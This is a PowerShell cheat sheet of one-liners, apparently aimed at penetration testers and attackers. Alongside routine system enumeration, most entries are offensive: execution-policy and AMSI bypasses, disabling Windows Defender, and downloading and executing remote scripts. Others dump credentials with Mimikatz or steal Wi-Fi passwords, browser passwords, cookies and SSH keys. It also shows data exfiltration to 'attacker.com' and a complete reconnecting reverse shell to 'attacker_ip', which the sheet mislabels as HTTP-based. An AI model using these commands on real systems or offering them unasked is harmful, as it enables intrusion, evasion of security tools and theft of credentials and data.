# Powershell Tips & Tricks
* **Execution Policy Bypass**
```powershell
powershell -ep bypass
```
* **Enumerating System Information**

This command retrieves detailed information about the operating system, including version, build, and system
architecture.
```powershell
Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *
```

* **Extracting Network Configuration**

This command gathers network configuration details such as interface aliases, IPv4 and IPv6 addresses, and
DNS server information.
```powershell
Get-NetIPConfiguration | Select-Object -Property InterfaceAlias, IPv4Address, IPv6Address, DNServer
```

* **Listing Running Processes with Details**

Lists all currently running processes on the system, sorted by CPU usage, and includes process names, IDs, and
CPU time.
```powershell
Get-Process | Select-Object -Property ProcessName, Id, CPU | Sort-Object -Property CPU -Descending
```

* **Accessing Event Logs for Anomalies**

Searches the Security event log for entries where the entry type is ‘FailureAudit’
, which can indicate securityrelated anomalies.
```powershell
Get-EventLog -LogName Security | Where-Object {$_.EntryType -eq 'FailureAudit'}
```

* **Scanning for Open Ports**

Scans the first 1024 ports on the local machine to check for open ports, which can be used to identify potential
vulnerabilities
```powershell
1..1024 | ForEach-Object { $sock = New-Object System.Net.Sockets.TcpClient; $async =
$sock.BeginConnect('localhost', $_, $null, $null); $wait = $async.AsyncWaitHandle.WaitOne(100, $false);
if($sock.Connected) { $_ } ; $sock.Close() }
```

* **Retrieving Stored Credentials**

Prompts for user credentials and then displays the username and password, useful for credential harvesting.
```powershell
$cred = Get-Credential; $cred.GetNetworkCredential() | Select-Object -Property UserName, Password
```

* **Executing Remote Commands**

Executes a command remotely on a target PC, in this case, listing processes. Requires credentials for the target
system.
```powershell
Invoke-Command -ComputerName TargetPC -ScriptBlock { Get-Process } -Credential (Get-Credential)
```

* **Downloading and Executing Scripts from URL**

Downloads and executes a PowerShell script from a specified URL. Useful for executing remote payloads.
```powershell
$url = 'http://example.com/script.ps1'; Invoke-Expression (New-Object Net.WebClient).DownloadString($url)
```

* **Bypassing Execution Policy for Script Execution**

Temporarily bypasses the script execution policy to run a PowerShell script, allowing execution of unsigned
scripts.
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; .\script.ps1
```

* **Enumerating Domain Users**

Retrieves a list of all domain users, including their names, account status, and last logon dates.
```powershell
Get-ADUser -Filter * -Properties * | Select-Object -Property Name, Enabled, LastLogonDate
```

* **Extracting Wi-Fi Profiles and Passwords**

Extracts Wi-Fi network profiles and their associated passwords stored on the system.
```powershell
netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name="$_" key=clear }
```

* **Monitoring File System Changes**

Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for
detecting suspicious activity.
```powershell
$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\';
$watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent
$watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }
```

* **Creating Reverse Shell**

Establishes a reverse shell connection to a specified attacker-controlled machine, allowing remote command
execution.
```powershell
$client = New-Object System.Net.Sockets.TCPClient('attacker_ip', attacker_port); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535...
```


* **Disabling Windows Defender**

Disables Windows Defender’s real-time monitoring feature, which can help in evading detection.
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

* **Extracting Browser Saved Passwords**

Extracts passwords saved in web browsers and saves them to a file, useful for credential harvesting.
```powershell
Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\temp\browser_passwords.txt
```

* **Bypassing AMSI (Anti-Malware Scan Interface)**

Bypasses the Anti-Malware Scan Interface (AMSI) in PowerShell, allowing the execution of potentially
malicious scripts without detection.
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

* **Extracting System Secrets with Mimikatz**

Uses Mimikatz to extract logon passwords and other sensitive data from system memory.
```powershell
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' | Out-File -FilePath C:\temp\logonpasswords.txt
```

* **In-Memory Script Execution**

Executes a PowerShell script entirely in memory without writing to disk, helping to evade file-based detection
mechanisms.
```powershell
$code = [System.IO.File]::ReadAllText('C:\temp\script.ps1'); Invoke-Expression $code
```

* **Out-Of-Band Data Exfiltration**

Exfiltrates data out of the target network using web requests, which can bypass traditional data loss
prevention mechanisms.
```powershell
$data = Get-Process | ConvertTo-Json; Invoke-RestMethod -Uri 'http://attacker.com/data' -Method Post -Body $data
```

* **Retrieving Browser Cookies for Credential Theft**

Accesses the Chrome browser’s Cookies file, which can contain session cookies that might be exploited for
session hijacking.
```powershell
$env:USERPROFILE + '\AppData\Local\Google\Chrome\User Data\Default\Cookies' | Get-Item
```

* **Extracting Credentials from IIS Application Pools**

Retrieves configuration details of IIS Application Pools, including service accounts, which might contain
credentials.
```powershell
Import-Module WebAdministration; Get-IISAppPool | Select-Object Name, ProcessModel
```

* **Extracting SSH Keys from User Directories**

Searches for RSA private keys in the .ssh directories of all users, which can be used for unauthorized access to
SSH servers.
```powershell
Get-ChildItem -Path C:\Users\*\.ssh\id_rsa -Recurse
```

* **Retrieving Credentials from Database Connection Strings**

Scans for database connection strings in web application configuration files, which often contain credentials
for database access.
```powershell
Select-String -Path C:\inetpub\wwwroot\*.config -Pattern 'connectionString' -CaseSensitive
```

* **HTTP-Based PowerShell Reverse Shell**

This script creates a more resilient reverse shell that attempts to reconnect every 10 seconds if the connection
is lost. It uses HTTP for communication.
```powershell
while($true) { try { $client = New-Object System.Net.Sockets.TCPClient('attacker_ip', attacker_port);
$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0,$bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()}; $client.Close() } catch { Start-Sleep -Seconds 10 } }
```
















